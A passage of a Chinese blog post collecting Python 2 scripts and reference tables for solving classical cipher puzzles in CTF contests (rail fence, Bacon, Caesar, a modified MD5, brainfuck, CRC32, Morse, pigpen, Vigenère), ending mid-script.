<h3 id="RSA解密"><a href="#RSA解密" class="headerlink" title="RSA解密"></a>RSA解密</h3><p>关于RSA相关内容，我之前有总结过，可移步：<a href="http://thief.one/2016/09/06/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%A7%A3%E6%9E%90/">RSA加密算法解析</a></p>
<h3 id="栅栏加密"><a href="#栅栏加密" class="headerlink" title="栅栏加密"></a>栅栏加密</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">***栅栏加密方法***</div><div class="line">加密方法自行百度，解密方法如下：</div><div class="line">例子：adaufdns p</div><div class="line">先计算密文的长度，如长度为10(空格也算)，因为每行的字符串数量一样，因此这里要么是分为5行，要么就是2行。</div><div class="line">假设是分为2行，则每5个为一行分开：</div><div class="line">adauf（前5）</div><div class="line">dns p（后5）</div><div class="line">再将每行首字符合并：</div><div class="line">答案：addnasu fp</div><div class="line">多行的话也是一样</div><div class="line">@By nmask   2016.12.6</div><div class="line">'<span class="string">''</span></div><div class="line">string=<span class="string">"tn c0afsiwal kes,hwit1r  g,npt  ttessfu&#125;ua u  hmqik e &#123;m,  n huiouosarwCniibecesnren."</span></div><div class="line">string=list(string)</div><div class="line"><span class="built_in">print</span> <span class="string">'String len is :'</span>,len(string)    <span class="comment">##字符串总长度</span></div><div class="line">result=[]</div><div class="line">answer=<span class="string">""</span></div><div class="line">i=17 <span class="comment">##因为长度为85，因此这里写17或者5</span></div><div class="line">def split_list(st):</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    将密文字符串分隔成多行，每行的数量一样。</div><div class="line">    '<span class="string">''</span></div><div class="line">    st1=st[0:i]</div><div class="line">    result.append(st1)</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(st)/i-1):</div><div class="line">        sts=st[i*(j+1):i*(j+2)]</div><div class="line">        result.append(sts)</div><div class="line">    <span class="built_in">return</span> result</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    result=split_list(string)</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    将每行的首字符相组合</div><div class="line">    '<span class="string">''</span></div><div class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> range(i):</div><div class="line">        sums=<span class="string">""</span></div><div class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> result:</div><div class="line">            sums=sums+n[m]</div><div class="line">        answer+=sums</div><div class="line">    <span class="built_in">print</span> answer</div></pre></td></tr></table></figure>
<h3 id="培根加密算法"><a href="#培根加密算法" class="headerlink" title="培根加密算法"></a>培根加密算法</h3><p>培根算法对照表如下：<br>A aaaaa<br>B aaaab<br>C aaaba<br>D aaabb<br>E aabaa<br>F aabab<br>G aabba<br>H aabbb<br>I abaaa<br>J abaab<br>K ababa<br>L ababb<br>M abbaa<br>N abbab<br>O abbba<br>P abbbb<br>Q baaaa<br>R baaab<br>S baaba<br>T baabb<br>U babaa<br>V babab<br>W babba<br>X babbb<br>Y bbaaa<br>Z bbaab</p>
<p>解密源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">@培根加密算法</div><div class="line">'<span class="string">''</span></div><div class="line">string=<span class="string">"ABAAAABABBABAAAABABAAABAAAAAABAAAAAAAABAABBBAABBAB"</span></div><div class="line">dicts=&#123;<span class="string">'aabbb'</span>: <span class="string">'H'</span>, <span class="string">'aabba'</span>: <span class="string">'G'</span>, <span class="string">'baaab'</span>: <span class="string">'R'</span>, <span class="string">'baaaa'</span>: <span class="string">'Q'</span>, <span class="string">'bbaab'</span>: <span class="string">'Z'</span>, <span class="string">'bbaaa'</span>: <span class="string">'Y'</span>, <span class="string">'abbab'</span>: <span class="string">'N'</span>, <span class="string">'abbaa'</span>: <span class="string">'M'</span>, <span class="string">'babaa'</span>: <span class="string">'U'</span>, <span class="string">'babab'</span>: <span class="string">'V'</span>, <span class="string">'abaaa'</span>: <span class="string">'I'</span>, <span class="string">'abaab'</span>: <span class="string">'J'</span>, <span class="string">'aabab'</span>: <span class="string">'F'</span>, <span class="string">'aabaa'</span>: <span class="string">'E'</span>, <span class="string">'aaaaa'</span>: <span class="string">'A'</span>, <span class="string">'aaaab'</span>: <span class="string">'B'</span>, <span class="string">'baabb'</span>: <span class="string">'T'</span>, <span class="string">'baaba'</span>: <span class="string">'S'</span>, <span class="string">'aaaba'</span>: <span class="string">'C'</span>, <span class="string">'aaabb'</span>: <span class="string">'D'</span>, <span class="string">'abbbb'</span>: <span class="string">'P'</span>, <span class="string">'abbba'</span>: <span class="string">'O'</span>, <span class="string">'ababa'</span>: <span class="string">'K'</span>, <span class="string">'ababb'</span>: <span class="string">'L'</span>, <span class="string">'babba'</span>: <span class="string">'W'</span>, <span class="string">'babbb'</span>: <span class="string">'X'</span>&#125;</div><div class="line">sums=len(string)</div><div class="line">j=5   <span class="comment">##每5个为一组</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(sums/j):</div><div class="line">    result=string[j*i:j*(i+1)].lower()</div><div class="line">    <span class="built_in">print</span> dicts[result],</div></pre></td></tr></table></figure></p>
<h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><p>得知是凯撒加密以后，可以用127次轮转爆破的方式解密<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">@凯撒加密</div><div class="line">'<span class="string">''</span></div><div class="line">lstr=<span class="string">''</span><span class="string">'U8Y]:8KdJHTXRI&gt;XU#?!K_ecJH]kJG*bRH7YJH7YSH]*=93dVZ3^S8*$:8"&amp;:9U]RH;g=8Y!U92'</span>=j*<span class="variable">$KH</span>]ZSj&amp;[S<span class="comment">#!gU#*dK9\.'''</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(127):  </div><div class="line">    str1 = <span class="string">''</span>  </div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lstr:  </div><div class="line">        temp = chr((ord(i)+p)%127)  </div><div class="line">        <span class="keyword">if</span> 32&lt;ord(temp)&lt;127 :  </div><div class="line">            str1 = str1 + temp   </div><div class="line">            feel = 1  </div><div class="line">        <span class="keyword">else</span>:  </div><div class="line">            feel = 0  </div><div class="line">            <span class="built_in">break</span>  </div><div class="line">    <span class="keyword">if</span> feel == 1:</div><div class="line">        <span class="built_in">print</span> str1</div></pre></td></tr></table></figure></p>
<h3 id="变异md5加密"><a href="#变异md5加密" class="headerlink" title="变异md5加密"></a>变异md5加密</h3><p>33位md5解密代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">CMD5加密</div><div class="line">@By nMask 2016.12.6</div><div class="line">一般md5的密文为16或者32位长度的字符串。</div><div class="line">本脚本为，从33位加密的密文中，遍历删除一位长度，然后用md5解密。</div><div class="line">@解密网站：http://www.cmd5.com/b.aspx</div><div class="line">'<span class="string">''</span></div><div class="line">string=<span class="string">"cca9cc444e64c8116a30la00559c042b4"</span></div><div class="line">string=list(string)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    遍历删除一位，然后将字符串放入cmd5网站，批量解密。</div><div class="line">    '<span class="string">''</span></div><div class="line">    result=string[:] <span class="comment">##复制一个列表，不会改变原列表。</span></div><div class="line">    result.pop(i)</div><div class="line">    </div><div class="line">    <span class="built_in">print</span> <span class="string">""</span>.join(result)</div></pre></td></tr></table></figure></p>
<h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p>brainfuck语言是比较难编写的一门语言，只有8个字符标识，需要写解释器，解释出用该语言编写的内容<br>其标识符含义如下：</p>
<ul>
<li><em>&gt;</em>指针加一</li>
<li>&lt;指针减一</li>
<li>+指针指向的字节的值加一</li>
<li>-指针指向的字节的值减一</li>
<li>.输出指针指向的单元内容（ASCⅡ码）</li>
<li>,输入内容到指针指向的单元（ASCⅡ码）</li>
<li>[如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处</li>
<li>]如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处</li>
</ul>
<p>解释器代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line">import os</div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">brainfuck语言解释器</div><div class="line">用法：将brainfuck内容存入文本中，保存为.bf格式，然后运行run函数</div><div class="line">'<span class="string">''</span></div><div class="line">def mainloop(program, bracket_map):  </div><div class="line">    pc = 0  </div><div class="line">    tape = Tape()  </div><div class="line">    <span class="keyword">while</span> pc &lt; len(program):  </div><div class="line">        code = program[pc]  </div><div class="line">        <span class="keyword">if</span> code == <span class="string">"&gt;"</span>:  </div><div class="line">            tape.advance()  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"&lt;"</span>:  </div><div class="line">            tape.devance()  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"+"</span>:  </div><div class="line">            tape.inc()  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"-"</span>:  </div><div class="line">            tape.dec()  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"."</span>:  </div><div class="line">            os.write(1, chr(tape.get()))  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">","</span>:   </div><div class="line">            tape.set(ord(os.read(0, 1)[0]))  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"["</span> and tape.get() == 0:   </div><div class="line">            pc = bracket_map[pc]  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"]"</span> and tape.get() != 0:  </div><div class="line">            pc = bracket_map[pc]  </div><div class="line">        pc += 1</div><div class="line"></div><div class="line">class Tape(object):  </div><div class="line">    def __init__(self):  </div><div class="line">        self.thetape = [0]  </div><div class="line">        self.position = 0  </div><div class="line">    def get(self):  </div><div class="line">        <span class="built_in">return</span> self.thetape[self.position]  </div><div class="line">    def <span class="built_in">set</span>(self, val):  </div><div class="line">        self.thetape[self.position] = val  </div><div class="line">    def inc(self):  </div><div class="line">        self.thetape[self.position] += 1  </div><div class="line">    def dec(self):  </div><div class="line">        self.thetape[self.position] -= 1  </div><div class="line">    def advance(self):  </div><div class="line">        self.position += 1  </div><div class="line">        <span class="keyword">if</span> len(self.thetape) &lt;= self.position:  </div><div class="line">            self.thetape.append(0)  </div><div class="line">    def devance(self):  </div><div class="line">        self.position -= 1</div><div class="line"></div><div class="line">def parse(program):  </div><div class="line">    parsed = []  </div><div class="line">    bracket_map = &#123;&#125;  </div><div class="line">    leftstack = []  </div><div class="line">    pc = 0  </div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> program:  </div><div class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> (<span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">','</span>, <span class="string">'.'</span>):  </div><div class="line">            parsed.append(char)  </div><div class="line">            <span class="keyword">if</span> char == <span class="string">'['</span>:  </div><div class="line">                leftstack.append(pc)  </div><div class="line">            <span class="keyword">elif</span> char == <span class="string">']'</span>:  </div><div class="line">                left = leftstack.pop()  </div><div class="line">                right = pc  </div><div class="line">                bracket_map[left] = right  </div><div class="line">                bracket_map[right] = left  </div><div class="line">            pc += 1  </div><div class="line"></div><div class="line">    <span class="built_in">return</span> <span class="string">""</span>.join(parsed), bracket_map</div><div class="line"></div><div class="line">def run(fp):  </div><div class="line">    program_contents = <span class="string">""</span>  </div><div class="line">    <span class="keyword">while</span> True:  </div><div class="line">        <span class="built_in">read</span> = os.read(fp, 4096)  </div><div class="line">        <span class="keyword">if</span> len(<span class="built_in">read</span>) == 0:  </div><div class="line">            <span class="built_in">break</span>  </div><div class="line">        program_contents += <span class="built_in">read</span>  </div><div class="line">    os.close(fp)  </div><div class="line">    program, bm = parse(program_contents)  </div><div class="line">    mainloop(program, bm)  </div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    传入.bf文件</div><div class="line">    '<span class="string">''</span></div><div class="line">    run(os.open(<span class="string">"./1.bf"</span>, os.O_RDONLY, 0777))</div></pre></td></tr></table></figure></p>
<h3 id="CRC32"><a href="#CRC32" class="headerlink" title="CRC32"></a>CRC32</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">@crc32算法</div><div class="line">crc算法的结果可以转化为16进制。</div><div class="line">'<span class="string">''</span></div><div class="line">import binascii</div><div class="line">import datetime</div><div class="line"></div><div class="line">def all_date():</div><div class="line">    <span class="comment">#获取所有日期</span></div><div class="line">    result=[]</div><div class="line">    begin=datetime.date(1900,1,1) <span class="comment">#从1900年1月1日开始</span></div><div class="line">    end=datetime.date(3000,12,6) <span class="comment">#到3000年12月6日结束</span></div><div class="line"></div><div class="line">    delta=datetime.timedelta(days=1)</div><div class="line">    d=begin</div><div class="line"></div><div class="line">    <span class="keyword">while</span> d&lt;=end:</div><div class="line">        date=d.strftime(<span class="string">"%Y%m%d"</span>)</div><div class="line">        d+=delta</div><div class="line">        result.append(date)</div><div class="line"></div><div class="line">    <span class="built_in">return</span> result</div><div class="line"></div><div class="line">def _crc32(content): </div><div class="line">  <span class="comment">#crc32解密</span></div><div class="line">  <span class="built_in">return</span> <span class="string">'%x'</span> % (binascii.crc32(content) &amp; 0xffffffff) <span class="comment">#取crc32的八位数据 %x返回16进制</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    result=all_date()</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</div><div class="line">        <span class="comment">#遍历每一个日期，暴力破解出密文结果</span></div><div class="line">        tag=_crc32(i)</div><div class="line">        <span class="keyword">if</span> tag==<span class="string">"4d1fae0b"</span>:  <span class="comment">##16进制密文</span></div><div class="line">            <span class="built_in">print</span> i</div></pre></td></tr></table></figure>
<h3 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h3><ul>
<li>-　　表示往右</li>
<li>.　　表示往左</li>
</ul>
<p>对照图：<br><img src="/upload_image/20170613/1.png" alt=""></p>
<h3 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h3><p>参考图：<br><img src="/upload_image/20170613/2.png" alt=""></p>
<h3 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h3><p>维吉尼亚密码是凯撒密码的升级版。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">key=<span class="string">'abc'</span></div><div class="line"><span class="comment">#密文内容如下</span></div><div class="line">ciphertext=<span class="string">'csirxeerjsqraeehruamjkxhboaoylgvtsshewqpkbbuarnqhucojvyhpkpeflphvqkfytuhrtdgvbnqgkvwlyprbodpzumsghnkurmjcengiyocfobnswgkrfaipwucmusrprjjruwreibqsdpgxhrqjcglgvdajkiemtebolpkrdvzygnzatavgonwwbqsstvegzaekjxaynebtwszesroflakxrhqodnvxjsesrlwwywiggkkadvrmbvwhztgfugvqrqhrcjfnoldinsntzwmgretfrvrudpcpljlpvzdrpwopneolqsrfrboyowzkefvhpnkrdfdoanopbpygraowqvtbroanopwzruhrewhmtgknchjlsftgkrzciligvdsfhijlnnwtciexiihcoegiedhrwhpvfmsprrsevesztgoezvcxaooazneicweqgrtvmqegkaqbqxvytfrfhpkghpdqgrkiieofkrtvmxobvioyoxfcenfhepgoelzdwpkwyphnvlpnvsngkahnepvdhrhaeacgaxhswgkiremrzrtbvinbqehvqglcrnqtdiuxhrfdocwiinlbvedkjepghnhjrxyppbrlznviaevyvnsxvctjroampwwvwdoylgvrrbziyovsshfdoguidpnqrudakdegkwhuhvypaqkieavlephezvqkrwiphidcplacsuoagejdhrfrtmuleewaoevjczoqwhppcpljduoswiidhelnvqpkdbzjotdmeourwolncrsuhdoqsmtveqxpltkgefzeafwlizutkhpzqanghwffdruxerwsluqysrzdcvvwntmzlnriuaeyoovrwvzpsgrmlsgwmnohhnoonttukixqpilrpabgdvpqrrqcsbjmnxljuuhqrjbrdfcmpghzrqgreykseerppvkrgtdipvwsvdtzdcsivxejkafrlwdjcnwoqngrdfwdszryjpaaghpbtmefwksffegphrucsirxeewdfrhxypcnxcfatecrdjrnosertnoeepgwenrbhrdvjmeprmpaevojgarjlxyztuhrlvkqayvwbqemiosgkaepczeohabfzigeajdymgvleelowajareeevawqeiaagpvrrxyprnqixinwcbqrsahseehreayscrdgkaehhwktoadmzvixhrpegurakzgrwdcgckavqpvrpsldetlvpavlezdrsebhijlrftfzgsnjlhzvdqkseprnbcgvoedzcqrhvniqhsepcxtuhxsfwxytntwoozaxhrpktszslwdohaniwgufuwqrzlznhprndquxsbiajrucfyeexnyqpkiadywefpvhigknzkniaezebahvrwiphegmpxunohmsumxstrqsltnxhrdjwzdpjlwnbuyekxtvqczleckllxlnridsugkafzrhvcaghljngvoplkiffeknhnstpzhsuewdsedfsttfhnoacpigwhsolpcehrzhtbgvaoeehnstvlrfdglqpmnfhwfpkswehrgunpgwsfjhcihwrydsdnxquxaxljuuhvwzrulsxikhsruroawqrcynqnsmqvdruooylgveotriybqxhrkkifheeorrwrtmxituhiphwsenefkermvwiaverrvlvdtnutdotswvqchuhlfcrviipltebolpcegiidhvvglzfinruxwyoxyplvcaclvscylipbqxyprbrflvfkoqrsbgkitsizqejwwxsvgaoylgvsenusepgzovfagbieetmnosepcxhnyaunwlvceqworiyoagkaftleeeaeptsmevojgdieowgpbooedivleezdwpkxlcnvqtztkxtyhyoxhwrwiphelbuxhrpwbqwlvjmnnesmtwmnohsedkrtnpkaabgvfvyaoqymtpfermlkcxeesezydvrwiphczugwucrjozxwycobpstbvmntrjwglwrmlhhclbgvpvohoevqfviajaswqoauwdspdxvcpvollzsyefwecavectcrdnoajiaqpehfwsyprpxrcmpxiqhjhvwctciflsnwotohqzsqecyprvqamqnmtlwkfrpidmeedpzmofesrnspuenwiajahiaxhrfwhrutzwlnutptnwaylysgkekznrviomqjtuhiifkvfzmjllwucoeuhnhnopvcaagtsmqxhruowqhazwlzdkppgvsurnhruwypbehavaqjfgzkdvhgvdfermepgqufkncbpsepsvgeximisuhnguumevszdlwmtxhnqajruaytlrdnzbjirpdqgrvlvcnrfkewivojkeuulrkztuhtcmgwwuhnsnsmxpoapidbcoefkafsrvrdeeseybymtuvkarhjwzrgdltkgfrvqcguhvjplseansvshrujcepecsevjheajisgxipyhwlaoadsxinpefwwhrdrufsrvtsmoysuukczwsipapkaxwtiacsnccumreeuhirpvxhrfdsfkmipcnwcsirxeevelclkrydchpamtefvvdtbrxdlnudslvkrvvwwhvrrwzrgkeocelefvktgkiyzufhwsqelhrgazvyiidtbdfcwijobwioadpznebespzxisgkeggueedapwizvcrdnipsedtvcpyhxtvigoayaffdxzznjltsbjiferczrwwyprfhlqqpxogkavbxwvehrgunpgwsffkcxlwksrbziyofmsuhooagqrviajadwwttudpvnvxfzmhfhamrteezdwpkgrfsrvawqeituhzipkijdaaghpzdebleqharxkseprovwtkrvqjwajgypsulrpkcxtbvjsrcimtoyhnetaelvfawfjmmpngkemidcblwdsqxgypsfdnobqleevqfcumjptuhbljaxueqowawsraitwhpkjisulnspdxraprdrdqpeteharvuiteiajhpzvstuhioeflylrrvhzcuihrgegnstvlrfeuepkwgeljfrpezysohhtvfxosokogrrzesbzntvvlenlnderqgeiajawqeitbuaanuoksagvhppcwoswabfhielcnwwtbjsugdcfvqflenryeciiviazehuryklcnwcsirxeevajrqedldghaaitxynoeqreitzmrvarcgwtnwwangxvlpnutjinsntzehuwlvxaefhsitituhdogwiilnqdvpzaxiehzrbuqffsrzhzncplfdozrhtwcedxeybncoaouhbeimtoyhnetaaoxhjicpsdpngvllbgvblwdszdvtshnuelvfxhrkwhghvksepkaciexeevcwihectcrpaygtmdqoagnqhjeoeledqpglhgebtwlvqazrudejcifdnoihrctkrdwcqvmntgagxwlvsagweczgzenoohudxkselkagmvianohrnbfvnahveeqoihnvlialwypdulmmggxeeqwzybwklnqlnravmlydpdzwireizhawqeibrfkarvmeduyweoiphtvuarbifvtnteoxjcvdrgswgkvzodyhslvfwhroaoihwtwavpiyovlaglpknvxypsgxptlgwtghwdnuxpehnwssmjedryafohieeonoinmvvyvqchbsprjcerqfmvaigkwtydqzygbfhlxvirrlcvgwlvburhndktsqhhpueryeoaylcptgevrvpvrwiraaewylvfinghnggkixlrqhnhpgvefkaqbpijfpbqtszgilvyebtsprjiajclzfwpnljhvqkksejkiemtssrvkbnusjptehecmffepdqgrwlvburhnznjiaewovnwijhhvwecwuisnsncphwjtoarfxwticnuzgxlrxdaagqfmgrsnqzsihrksejkiemtebolpsawiidtuhglzfinnoeqrwlvymrhtdbjikvqcoagulpeawhpywieadbwtxvvoisiincnxtbshsnvizyterdfkgwhrupfngidlrxshciuiosiswgklzdhrddhpkghfkaigwiidagwhpanmguwagggmjdaglsqiexibqswgkejfbwhceinmcrlowaymkpdbuszugqitkpgnbsioeehdewrpaldcozhswnrbtupbymtuwdsdxivyaagtsmtisgrbvruwlmjrftdjwxtuhcozhultcxoyomugeagowawstsabvltdgjlnpebtrwrcehveoiuqayoahfdruseqjeswiwafewzyveeoaylcpwpgenjwwapivesgkenpgwhvuaqnwxypqhheywhlenupggkiezrqhrdbjicnwpcohfvsengeowppygrdoihlvcekhcfbksnruyczsprtngkaebjmsvveacrwjtbyhstveituhdsngmjllywhlbeenohosrqswsizeeniwwegkaqnwfvwoajsewvleqxyvrvwksedxepvkwperidghhkzrroelagxhrgqquhwjqrbppcqusngrnsfrpmptuhmlbvirpkwdghvetnrwhpuqgkgxnhyhwjeoebtsmfycuhogvvfizutktewvlepukehhxxcohqdlbcpiphofrtyvdtfkeccomnnwagbqjzydvqgxwtelfljsihvpehvqglzqynqkafgkihferqoqpgergvzwfpmjdefkecekxhgkahuuireoshxpkwxibqwbqvlvtnguooceisnoeqrwsksetuyapqrwurpoxhwyprgrtsmoscxwqfgoiksezrcvbwvtyhegihvpdaqhvpvvlohjdvrkejyofrrcwyleguesfwskplykidavsrldxchwlfhhrxsplvsbrdnsnoxlctyhiyaelobosvvflksetuyapqriawafextkdsbwhlbvlelfwbcoeplgnpenpcttrupsaossdtruqfifviyoahuhqfnkgxretgenqwdstucgsoagaykgxogkazbewkprdxaozkplrzdwyhectcruenqvisedpvrumenoeuenbnctvvpvrysznebitsmnsbfwafgkidzcxwucbnisvqcggkidmenxttnwpsbxlrhumerwulcsbjigeblvbqhilgfdltkgewnbbcedrzxprqdtvixrvdhqudtkprroegmpahbvpcyhxyptnutdinmcrdphrqhjltelawqpahvfdhuhoelvrrfsmcvtfloopfyjpdbisemcpiajpvrtyvpnfwacbuxhrmqfllwtzmcrsplqjvnuechveetmnostvepuqljuolpcehroikithtuhsvvwiilbolttavleprqfgvxifmchtpzcrdgkaxhgkvtsgkevqpkoskaoewwufrvqgepgtrbfasqlrxdaylcpnkrdfwdogvlvtsfwellkpytukkvqkclrthrepghoepkifhwtzlqvawqeiaagpsyowyprfkesiuroelcvgwsxcojdtdcelaedlwqsetpaagtlsgypnohhuhezcaylcpaesfsvwbqfecwsgkeowtqohvagnfgldagloyzkhipxhchvfvnahvepdgvybqauerajlnqvhpkcrnbwdsysmkxenqwsqniwvwjsfvijltgkeezkelvqyzhgikseudtemtahbgegcoirdefdnontysguwhrvxypkvqgeptsutkdwflrutrrftlvuaeevpcgkihfefwizvkrgnqzhuhhlnhrvsdkqskpkwdghvkheyyeltkgefhrwqhrtpaylcpquxhrqyoyoiufpnvahqvrefvovrdgttdrqtltnckaryyfrzvctuhjfzafokzehuwlvlnvpawakrsvgaoagxypkvqgzzfirfwdsnqmdllfwommrpaphzpnfozytbwhpqtwenwoprisiptuhtcqcpcbqpwaxijehrniyocrddxasarvuprnoinmvsbrjkbrfmktntuuwmcplchngbqwdzrrwhlvcqiyhdwtkxfwenyeepggohupphwectcrgidxwxefwdsvunlogrpeybcrdehbifhwkzlrdvpajiaejqsfzmkstuhktvienqtqsrqswsenutdwxirgkafvgmtflbxsazqgergebtvimpngxawtavesxowajxfsoyghpzvsntxahuhulpeavhzcvwhrubozlpzlrbifhqvlhrudsngfleaylcpquynninovggrwlvqgepgqohwwgwxwklpnfkzneerqvfifwejehrbseitxtbvsoepsmpruhrltkgefvegghvnlkrvhpzwtferioquirxbexssqpkwudphhurjzugwommusmroaoihwrydartlajswruktcoeptntfaclujrbpwzvfijqaphawqeilrdrsfkiidifwecwpxhrewbxwszxatlnpinptuhyielsldhnsppvkrgfikfuhvjpls'</span></div><div class="line">ascii=<span class="string">'abcdefghijklmnopqrstuvwxyz'</span></div><div class="line">keylen=len(key)</div><div class="line">ctlen=len(ciphertext)</div><div class="line">plaintext = <span class="string">''</span></div><div class="line">i = 0</div><div class="line"><span 